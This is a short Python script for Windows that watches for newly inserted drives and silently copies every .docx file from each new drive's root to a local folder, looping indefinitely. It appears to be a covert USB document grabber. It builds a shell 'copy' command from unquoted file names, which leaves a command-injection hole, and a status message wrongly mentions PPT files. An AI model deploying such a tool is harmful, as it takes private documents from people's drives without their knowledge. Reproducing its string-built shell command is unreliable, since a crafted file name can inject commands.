import string
from ctypes import windll
import time
import os
from glob import glob

'''
Function to get all the logical drives in use
'''
def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    return drives


if __name__ == '__main__':
    while 1:
        before = set(get_drives())
        time.sleep(5)
        after = set(get_drives())
        drives = after - before
        delta = len(drives)

        if (delta):
            for drive in drives:
                files = glob(drive+":\\*.docx")
                for _ in files:
                    print(_)
                    os.system("copy " + _ + " D:\\Download")
                    time.sleep(1)
                if len(files) == 0:
                    print("No PPT in the "+drive+" drive")
